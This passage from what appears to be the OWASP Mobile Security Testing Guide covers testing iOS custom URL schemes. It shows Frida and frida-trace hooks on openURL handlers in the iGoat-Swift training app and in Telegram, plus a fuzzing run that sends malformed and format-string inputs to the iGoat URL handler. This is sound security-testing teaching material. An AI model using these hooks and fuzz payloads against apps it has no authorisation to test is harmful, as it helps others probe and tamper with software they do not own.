\NormalTok{RET}\OperatorTok{:} \BaseNTok{0x1}
\end{Highlighting}
\end{Shaded}

Now we know that:

\begin{itemize}
\tightlist
\item
  The method
  \texttt{-{[}iGoat\_Swift.AppDelegate\ application:openURL:options:{]}}
  gets called. As we have seen before, it is the recommended way and it
  is not deprecated.
\item
  It receives our URL as a parameter: \texttt{igoat://}.
\item
  We also can verify the source application:
  \texttt{com.apple.mobilesafari}.
\item
  We can also know from where it was called, as expected from
  \texttt{-{[}UIApplication\ \_applicationOpenURLAction:payload:origin:{]}}.
\item
  The method returns \texttt{0x1} which means \texttt{YES}
  (\href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc\#return-value}{the
  delegate successfully handled the request}).
\end{itemize}

The call was successful and we see now that the iGoat app was open:

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/c441621c9bee29c2fbc9a04d05bc8426d67bfff9.jpg}
\caption{Images/Chapters/0x06h/iGoat\_opened\_via\_url\_scheme.jpg}
\end{figure}

Notice that we can also see that the caller (source application) was
Safari if we look in the upper-left corner of the screenshot.

Dynamically Opening the Link from the App Itself

It is also interesting to see which other methods get called on the way.
To change the result a little bit we will call the same URL scheme from
the iGoat app itself. We will use again ObjC method observer and the
Frida REPL:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U iGoat}\OperatorTok{{-}}\NormalTok{Swift }\OperatorTok{{-}{-}}\NormalTok{codeshare mrmacete}\OperatorTok{/}\NormalTok{objc}\OperatorTok{{-}}\NormalTok{method}\OperatorTok{{-}}\NormalTok{observer}

\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \KeywordTok{function} \AttributeTok{openURL}\NormalTok{(url) }\OperatorTok{\{}
                            \KeywordTok{var}\NormalTok{ UIApplication }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\VariableTok{UIApplication}\NormalTok{.}\AttributeTok{sharedApplication}\NormalTok{()}\OperatorTok{;}
                            \KeywordTok{var}\NormalTok{ toOpen }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\VariableTok{NSURL}\NormalTok{.}\AttributeTok{URLWithString\_}\NormalTok{(url)}\OperatorTok{;}
                            \ControlFlowTok{return} \VariableTok{UIApplication}\NormalTok{.}\AttributeTok{openURL\_}\NormalTok{(toOpen)}\OperatorTok{;}
                        \OperatorTok{\}}

\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \AttributeTok{observeSomething}\NormalTok{(}\StringTok{"*[* *openURL*]"}\NormalTok{)}\OperatorTok{;}
\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \AttributeTok{openURL}\NormalTok{(}\StringTok{"iGoat://?contactNumber=123456789\&message=hola"}\NormalTok{)}

\NormalTok{(}\BaseNTok{0x1c409e460}\NormalTok{)  }\OperatorTok{{-}}\NormalTok{[\_\_NSXPCInterfaceProxy\_\_LSDOpenProtocol openURL}\OperatorTok{:}\NormalTok{options}\OperatorTok{:}\NormalTok{completionHandler}\OperatorTok{:}\NormalTok{]}
\NormalTok{openURL}\OperatorTok{:}\NormalTok{ iGoat}\OperatorTok{:}\CommentTok{//?contactNumber=123456789\&message=hola}
\NormalTok{options}\OperatorTok{:}\NormalTok{ nil}
\NormalTok{completionHandler}\OperatorTok{:} \OperatorTok{<}\NormalTok{\_\_NSStackBlock\_\_}\OperatorTok{:} \BaseNTok{0x16fc89c38}\OperatorTok{>}
\BaseNTok{0x183befbec}\NormalTok{ MobileCoreServices}\OperatorTok{!{-}}\NormalTok{[LSApplicationWorkspace openURL}\OperatorTok{:}\NormalTok{withOptions}\OperatorTok{:}\NormalTok{error}\OperatorTok{:}\NormalTok{]}
\BaseNTok{0x10ba6400c}
\NormalTok{...}
\NormalTok{RET}\OperatorTok{:}\NormalTok{ nil}

\NormalTok{...}

\NormalTok{(}\BaseNTok{0x101d0fad0}\NormalTok{)  }\OperatorTok{{-}}\NormalTok{[UIApplication openURL}\OperatorTok{:}\NormalTok{]}
\NormalTok{openURL}\OperatorTok{:}\NormalTok{ iGoat}\OperatorTok{:}\CommentTok{//?contactNumber=123456789\&message=hola}
\BaseNTok{0x10a610044}
\NormalTok{...}
\NormalTok{RET}\OperatorTok{:} \BaseNTok{0x1}

\KeywordTok{true}
\NormalTok{(}\BaseNTok{0x1c4038280}\NormalTok{)  }\OperatorTok{{-}}\NormalTok{[}\VariableTok{iGoat\_Swift}\NormalTok{.}\AttributeTok{AppDelegate}\NormalTok{ application}\OperatorTok{:}\NormalTok{openURL}\OperatorTok{:}\NormalTok{options}\OperatorTok{:}\NormalTok{]}
\NormalTok{application}\OperatorTok{:} \OperatorTok{<}\NormalTok{UIApplication}\OperatorTok{:} \BaseNTok{0x101d0fad0}\OperatorTok{>}
\NormalTok{openURL}\OperatorTok{:}\NormalTok{ iGoat}\OperatorTok{:}\CommentTok{//?contactNumber=123456789\&message=hola}
\NormalTok{options}\OperatorTok{:} \OperatorTok{\{}
\NormalTok{    UIApplicationOpenURLOptionsOpenInPlaceKey }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}
\NormalTok{    UIApplicationOpenURLOptionsSourceApplicationKey }\OperatorTok{=} \StringTok{"OWASP.iGoat{-}Swift"}\OperatorTok{;}
\OperatorTok{\}}
\BaseNTok{0x18b5030d8}\NormalTok{ UIKit}\OperatorTok{!}\NormalTok{\_\_58}\OperatorTok{{-}}\NormalTok{[UIApplication \_applicationOpenURLAction}\OperatorTok{:}\NormalTok{payload}\OperatorTok{:}\NormalTok{origin}\OperatorTok{:}\NormalTok{]\_block\_invoke}
\BaseNTok{0x18b502a94}\NormalTok{ UIKit}\OperatorTok{!{-}}\NormalTok{[UIApplication \_applicationOpenURLAction}\OperatorTok{:}\NormalTok{payload}\OperatorTok{:}\NormalTok{origin}\OperatorTok{:}\NormalTok{]}
\NormalTok{...}
\NormalTok{RET}\OperatorTok{:} \BaseNTok{0x1}
\end{Highlighting}
\end{Shaded}

The output is truncated for better readability. This time you see that
\texttt{UIApplicationOpenURLOptionsSourceApplicationKey} has changed to
\texttt{OWASP.iGoat-Swift}, which makes sense. In addition, a long list
of \texttt{openURL}-like methods were called. Considering this
information can be very useful for some scenarios as it will help you to
decide what you next steps will be, e.g.~which method you will hook or
tamper with next.

Opening a Link by Navigating to a Page and Letting Safari Open It

You can now test the same situation when clicking on a link contained on
a page. Safari will identify and process the URL scheme and choose which
action to execute. Opening this link
``\url{https://telegram.me/fridadotre}'' will trigger this behavior.

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/a9306a55201426996cd4188ec50973be63efb594.png}
\caption{Images/Chapters/0x06h/open\_in\_telegram\_via\_urlscheme.png}
\end{figure}

First of all we let frida-trace generate the stubs for us:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida{-}trace}\NormalTok{ {-}U Telegram {-}m }\StringTok{"*[* *restorationHandler*]"}\NormalTok{ {-}i }\StringTok{"*open*Url*"}
    \ExtensionTok{{-}m} \StringTok{"*[* *application*URL*]"}\NormalTok{ {-}m }\StringTok{"*[* openURL]"}

\ExtensionTok{...}
\ExtensionTok{7310}\NormalTok{ ms  {-}[UIApplication \_applicationOpenURLAction: 0x1c44ff900 payload: 0x10c5ee4c0 origin: 0x0]}
\ExtensionTok{7311}\NormalTok{ ms     }\KeywordTok{|} \ExtensionTok{{-}}\NormalTok{[AppDelegate application: 0x105a59980 openURL: 0x1c46ebb80 options: 0x1c0e222c0]}
\ExtensionTok{7312}\NormalTok{ ms     }\KeywordTok{|} \VariableTok{$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData}
            \ExtensionTok{18applicationContext20navigationController12dismissInputy0A4Core7AccountC\_AA14Open}
            \FunctionTok{URLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF()}
\end{Highlighting}
\end{Shaded}

Now we can simply modify by hand the stubs we are interested in:

\begin{itemize}
\item
  The Objective-C method \texttt{application:openURL:options:}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// \_\_handlers\_\_/\_\_AppDelegate\_application\_openUR\_3679fadc.js}

\NormalTok{onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ args}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}
    \AttributeTok{log}\NormalTok{(}\StringTok{"{-}[AppDelegate application: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{2}\NormalTok{] }\OperatorTok{+}
                \StringTok{" openURL: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{3}\NormalTok{] }\OperatorTok{+} \StringTok{" options: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{4}\NormalTok{] }\OperatorTok{+} \StringTok{"]"}\NormalTok{)}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{application :"} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{2}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{openURL :"} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{3}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{options :"} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{4}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
\OperatorTok{\},}
\end{Highlighting}
\end{Shaded}
\item
  The Swift method \texttt{\$S10TelegramUI15openExternalUrl...}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// \_\_handlers\_\_/TelegramUI/\_S10TelegramUI15openExternalUrl7\_b1a3234e.js}

\NormalTok{onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (log}\OperatorTok{,}\NormalTok{ args}\OperatorTok{,}\NormalTok{ state) }\OperatorTok{\{}

    \AttributeTok{log}\NormalTok{(}\StringTok{"TelegramUI.openExternalUrl(account, url, presentationData,"} \OperatorTok{+}
                \StringTok{"applicationContext, navigationController, dismissInput)"}\NormalTok{)}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{account: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{1}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{url: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{2}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{presentationData: "} \OperatorTok{+}\NormalTok{ args[}\DecValTok{3}\NormalTok{])}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{applicationContext: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{4}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \AttributeTok{log}\NormalTok{(}\StringTok{"}\SpecialCharTok{\textbackslash{}t}\StringTok{navigationController: "} \OperatorTok{+} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{5}\NormalTok{]).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
\OperatorTok{\},}
\end{Highlighting}
\end{Shaded}
\end{itemize}

The next time we run it, we see the following output:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida}\OperatorTok{{-}}\NormalTok{trace }\OperatorTok{{-}}\NormalTok{U Telegram }\OperatorTok{{-}}\NormalTok{m }\StringTok{"*[* *restorationHandler*]"} \OperatorTok{{-}}\NormalTok{i }\StringTok{"*open*Url*"}
    \OperatorTok{{-}}\NormalTok{m }\StringTok{"*[* *application*URL*]"} \OperatorTok{{-}}\NormalTok{m }\StringTok{"*[* openURL]"}

  \DecValTok{8144}\NormalTok{ ms  }\OperatorTok{{-}}\NormalTok{[UIApplication \_applicationOpenURLAction}\OperatorTok{:} \BaseNTok{0x1c44ff900}\NormalTok{ payload}\OperatorTok{:} \BaseNTok{0x10c5ee4c0}\NormalTok{ origin}\OperatorTok{:} \BaseNTok{0x0}\NormalTok{]}
  \DecValTok{8145}\NormalTok{ ms     }\OperatorTok{|} \OperatorTok{{-}}\NormalTok{[AppDelegate application}\OperatorTok{:} \BaseNTok{0x105a59980}\NormalTok{ openURL}\OperatorTok{:} \BaseNTok{0x1c46ebb80}\NormalTok{ options}\OperatorTok{:} \BaseNTok{0x1c0e222c0}\NormalTok{]}
  \DecValTok{8145}\NormalTok{ ms     }\OperatorTok{|}\NormalTok{     application}\OperatorTok{:} \OperatorTok{<}\NormalTok{Application}\OperatorTok{:} \BaseNTok{0x105a59980}\OperatorTok{>}
  \DecValTok{8145}\NormalTok{ ms     }\OperatorTok{|}\NormalTok{     openURL}\OperatorTok{:}\NormalTok{ tg}\OperatorTok{:}\CommentTok{//resolve?domain=fridadotre}
  \DecValTok{8145}\NormalTok{ ms     }\OperatorTok{|}\NormalTok{     options }\OperatorTok{:\{}
\NormalTok{                        UIApplicationOpenURLOptionsOpenInPlaceKey }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}
\NormalTok{                        UIApplicationOpenURLOptionsSourceApplicationKey }\OperatorTok{=} \StringTok{"com.apple.mobilesafari"}\OperatorTok{;}
                    \OperatorTok{\}}
  \DecValTok{8269}\NormalTok{ ms     }\OperatorTok{|}    \OperatorTok{|} \VariableTok{TelegramUI}\NormalTok{.}\AttributeTok{openExternalUrl}\NormalTok{(account}\OperatorTok{,}\NormalTok{ url}\OperatorTok{,}\NormalTok{ presentationData}\OperatorTok{,}
\NormalTok{                                        applicationContext}\OperatorTok{,}\NormalTok{ navigationController}\OperatorTok{,}\NormalTok{ dismissInput)}
  \DecValTok{8269}\NormalTok{ ms     }\OperatorTok{|}    \OperatorTok{|}\NormalTok{    account}\OperatorTok{:}\NormalTok{ nil}
  \DecValTok{8269}\NormalTok{ ms     }\OperatorTok{|}    \OperatorTok{|}\NormalTok{    url}\OperatorTok{:}\NormalTok{ tg}\OperatorTok{:}\CommentTok{//resolve?domain=fridadotre}
  \DecValTok{8269}\NormalTok{ ms     }\OperatorTok{|}    \OperatorTok{|}\NormalTok{    presentationData}\OperatorTok{:} \BaseNTok{0x1c4c51741}
  \DecValTok{8269}\NormalTok{ ms     }\OperatorTok{|}    \OperatorTok{|}\NormalTok{    applicationContext}\OperatorTok{:}\NormalTok{ nil}
  \DecValTok{8269}\NormalTok{ ms     }\OperatorTok{|}    \OperatorTok{|}\NormalTok{    navigationController}\OperatorTok{:} \VariableTok{TelegramUI}\NormalTok{.}\AttributeTok{PresentationData}
  \DecValTok{8274}\NormalTok{ ms     }\OperatorTok{|} \OperatorTok{{-}}\NormalTok{[UIApplication applicationOpenURL}\OperatorTok{:}\BaseNTok{0x1c46ebb80}\NormalTok{]}
\end{Highlighting}
\end{Shaded}

There you can observe the following:

\begin{itemize}
\tightlist
\item
  It calls \texttt{application:openURL:options:} from the app delegate
  as expected.
\item
  The source application is Safari (``com.apple.mobilesafari'').
\item
  \texttt{application:openURL:options:} handles the URL but does not
  open it, it calls \texttt{TelegramUI.openExternalUrl} for that.
\item
  The URL being opened is \texttt{tg://resolve?domain=fridadotre}.
\item
  It uses the \texttt{tg://} custom URL scheme from Telegram.
\end{itemize}

It is interesting to see that if you navigate again to
``\url{https://telegram.me/fridadotre}'', click on \textbf{cancel} and
then click on the link offered by the page itself (``Open in the
Telegram app''), instead of opening via custom URL scheme it will open
via universal links.

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/eecc821a0dd66cce69d08c4b2975ef636b355063.png}
\caption{Images/Chapters/0x06h/open\_in\_telegram\_via\_universallink.png}
\end{figure}

You can try this while tracing both methods:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida}\OperatorTok{{-}}\NormalTok{trace }\OperatorTok{{-}}\NormalTok{U Telegram }\OperatorTok{{-}}\NormalTok{m }\StringTok{"*[* *restorationHandler*]"} \OperatorTok{{-}}\NormalTok{m }\StringTok{"*[* *application*openURL*options*]"}

\CommentTok{// After clicking "Open" on the pop{-}up}

 \DecValTok{16374}\NormalTok{ ms  }\OperatorTok{{-}}\NormalTok{[AppDelegate application }\OperatorTok{:}\BaseNTok{0x10556b3c0}\NormalTok{ openURL }\OperatorTok{:}\BaseNTok{0x1c4ae0080}\NormalTok{ options }\OperatorTok{:}\BaseNTok{0x1c7a28400}\NormalTok{]}
 \DecValTok{16374}\NormalTok{ ms   application }\OperatorTok{:<}\NormalTok{Application}\OperatorTok{:} \BaseNTok{0x10556b3c0}\OperatorTok{>}
 \DecValTok{16374}\NormalTok{ ms   openURL }\OperatorTok{:}\NormalTok{tg}\OperatorTok{:}\CommentTok{//resolve?domain=fridadotre}
 \DecValTok{16374}\NormalTok{ ms   options }\OperatorTok{:\{}
\NormalTok{    UIApplicationOpenURLOptionsOpenInPlaceKey }\OperatorTok{=} \DecValTok{0}\OperatorTok{;}
\NormalTok{    UIApplicationOpenURLOptionsSourceApplicationKey }\OperatorTok{=} \StringTok{"com.apple.mobilesafari"}\OperatorTok{;}
\OperatorTok{\}}

\CommentTok{// After clicking "Cancel" on the pop{-}up and "OPEN" in the page}

\DecValTok{406575}\NormalTok{ ms  }\OperatorTok{{-}}\NormalTok{[AppDelegate application}\OperatorTok{:}\BaseNTok{0x10556b3c0}\NormalTok{ continueUserActivity}\OperatorTok{:}\BaseNTok{0x1c063d0c0}
\NormalTok{                restorationHandler}\OperatorTok{:}\BaseNTok{0x16f27a898}\NormalTok{]}
\DecValTok{406575}\NormalTok{ ms  application}\OperatorTok{:<}\NormalTok{Application}\OperatorTok{:} \BaseNTok{0x10556b3c0}\OperatorTok{>}
\DecValTok{406575}\NormalTok{ ms  continueUserActivity}\OperatorTok{:<}\NormalTok{NSUserActivity}\OperatorTok{:} \BaseNTok{0x1c063d0c0}\OperatorTok{>}
\DecValTok{406575}\NormalTok{ ms       webpageURL}\OperatorTok{:}\NormalTok{https}\OperatorTok{:}\CommentTok{//telegram.me/fridadotre}
\DecValTok{406575}\NormalTok{ ms       activityType}\OperatorTok{:}\NormalTok{NSUserActivityTypeBrowsingWeb}
\DecValTok{406575}\NormalTok{ ms       userInfo}\OperatorTok{:\{}
\OperatorTok{\}}
\DecValTok{406575}\NormalTok{ ms  restorationHandler}\OperatorTok{:<}\NormalTok{\_\_NSStackBlock\_\_}\OperatorTok{:} \BaseNTok{0x16f27a898}\OperatorTok{>}
\end{Highlighting}
\end{Shaded}

Testing for Deprecated Methods

Search for deprecated methods like:

\begin{itemize}
\tightlist
\item
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc}{\texttt{application:handleOpenURL:}}
\item
  \href{https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc}{\texttt{openURL:}}
\item
  \href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application}{\texttt{application:openURL:sourceApplication:annotation:}}
\end{itemize}

You may simply use frida-trace for this, to see if any of those methods
are being used.

\hypertarget{testing-url-schemes-source-validation}{%
\subparagraph{Testing URL Schemes Source
Validation}\label{testing-url-schemes-source-validation}}

A way to discard or confirm validation could be by hooking typical
methods that might be used for that. For example
\href{https://developer.apple.com/documentation/foundation/nsstring/1407803-isequaltostring}{\texttt{isEqualToString:}}:

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{// {-} (BOOL)isEqualToString:(NSString *)aString;}

\KeywordTok{var}\NormalTok{ isEqualToString }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\AttributeTok{NSString}\NormalTok{[}\StringTok{"{-} isEqualToString:"}\NormalTok{]}\OperatorTok{;}

\VariableTok{Interceptor}\NormalTok{.}\AttributeTok{attach}\NormalTok{(}\VariableTok{isEqualToString}\NormalTok{.}\AttributeTok{implementation}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{(args) }\OperatorTok{\{}
    \KeywordTok{var}\NormalTok{ message }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{2}\NormalTok{])}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(message)}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

If we apply this hook and call the URL scheme again:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U iGoat}\OperatorTok{{-}}\NormalTok{Swift}

\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \KeywordTok{var}\NormalTok{ isEqualToString }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\AttributeTok{NSString}\NormalTok{[}\StringTok{"{-} isEqualToString:"}\NormalTok{]}\OperatorTok{;}

                    \VariableTok{Interceptor}\NormalTok{.}\AttributeTok{attach}\NormalTok{(}\VariableTok{isEqualToString}\NormalTok{.}\AttributeTok{implementation}\OperatorTok{,} \OperatorTok{\{}
                      \DataTypeTok{onEnter}\OperatorTok{:} \KeywordTok{function}\NormalTok{(args) }\OperatorTok{\{}
                        \KeywordTok{var}\NormalTok{ message }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\AttributeTok{Object}\NormalTok{(args[}\DecValTok{2}\NormalTok{])}\OperatorTok{;}
                        \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(message)}
                      \OperatorTok{\}}
                    \OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\OperatorTok{\{\}}
\NormalTok{[iPhone}\OperatorTok{::}\NormalTok{iGoat}\OperatorTok{{-}}\NormalTok{Swift]}\OperatorTok{{-}>} \AttributeTok{openURL}\NormalTok{(}\StringTok{"iGoat://?contactNumber=123456789\&message=hola"}\NormalTok{)}
\KeywordTok{true}
\NormalTok{nil}
\end{Highlighting}
\end{Shaded}

Nothing happens. This tells us already that this method is not being
used for that as we cannot find any \emph{app-package-looking} string
like \texttt{OWASP.iGoat-Swift} or \texttt{com.apple.mobilesafari}
between the hook and the text of the tweet. However, consider that we
are just probing one method, the app might be using other approach for
the comparison.

\hypertarget{fuzzing-url-schemes}{%
\subparagraph{Fuzzing URL Schemes}\label{fuzzing-url-schemes}}

If the app parses parts of the URL, you can also perform input fuzzing
to detect memory corruption bugs.

What we have learned above can be now used to build your own fuzzer on
the language of your choice, e.g.~in Python and call the
\texttt{openURL} using
\href{https://www.frida.re/docs/javascript-api/\#rpc}{Frida's RPC}. That
fuzzer should do the following:

\begin{itemize}
\tightlist
\item
  Generate payloads.
\item
  For each of them call \texttt{openURL}.
\item
  Check if the app generates a crash report (\texttt{.ips}) in
  \texttt{/private/var/mobile/Library/Logs/CrashReporter}.
\end{itemize}

The \href{https://github.com/fuzzdb-project/fuzzdb}{FuzzDB} project
offers fuzzing dictionaries that you can use as payloads.

Using Frida

Doing this with Frida is pretty easy, you can refer to this
\href{https://grepharder.github.io/blog/0x03_learning_about_universal_links_and_fuzzing_url_schemes_on_ios_with_frida.html}{blog
post} to see an example that fuzzes the iGoat-Swift app (working on iOS
11.1.2).

Before running the fuzzer we need the URL schemes as inputs. From the
static analysis we know that the iGoat-Swift app supports the following
URL scheme and parameters:
\texttt{iGoat://?contactNumber=\{0\}\&message=\{0\}}.

\begin{verbatim}
$ frida -U SpringBoard -l ios-url-scheme-fuzzing.js
[iPhone::SpringBoard]-> fuzz("iGoat", "iGoat://?contactNumber={0}&message={0}")
Watching for crashes from iGoat...
No logs were moved.
Opened URL: iGoat://?contactNumber=0&message=0
OK!
Opened URL: iGoat://?contactNumber=1&message=1
OK!
Opened URL: iGoat://?contactNumber=-1&message=-1
OK!
Opened URL: iGoat://?contactNumber=null&message=null
OK!
Opened URL: iGoat://?contactNumber=nil&message=nil
OK!
Opened URL: iGoat://?contactNumber=99999999999999999999999999999999999
&message=99999999999999999999999999999999999
OK!
Opened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
&message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
OK!
Opened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
&message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
OK!
Opened URL: iGoat://?contactNumber='&message='
OK!
Opened URL: iGoat://?contactNumber=%20d&message=%20d
OK!
Opened URL: iGoat://?contactNumber=%20n&message=%20n
OK!
Opened URL: iGoat://?contactNumber=%20x&message=%20x
OK!
Opened URL: iGoat://?contactNumber=%20s&message=%20s
OK!
\end{verbatim}

The script will detect if a crash occurred. On this run it did not
detect any crashed but for other apps this could be the case. We would
be able to inspect the crash reports in
\texttt{/private/var/mobile/Library/Logs/CrashReporter} or in
\texttt{/tmp} if it was moved by the script.

Using IDB

In the \textbf{URL Handlers} section, go to the \textbf{Fuzzer} tab. On
the left side default IDB payloads are listed. Once you have generated
your payload list (e.g.~using FuzzDB), go to the \textbf{Fuzz Template}
section in the left bottom panel and define a template. Use
\texttt{\$@\$} to define an injection point, for example:

\begin{verbatim}
myURLscheme://$@$
\end{verbatim}

While the URL scheme is being fuzzed, watch the logs (see the section
``\href{0x06b-Basic-Security-Testing.md\#monitoring-system-logs}{Monitoring
System Logs}'' of the chapter ``iOS Basic Security Testing'' to observe
the impact of each payload. The history of used payloads is on the right
side of the IDB ``Fuzzer'' tab.

\hypertarget{testing-ios-webviews-mstg-platform-5}{%
\subsubsection{Testing iOS WebViews
(MSTG-PLATFORM-5)}\label{testing-ios-webviews-mstg-platform-5}}

\hypertarget{overview-65}{%
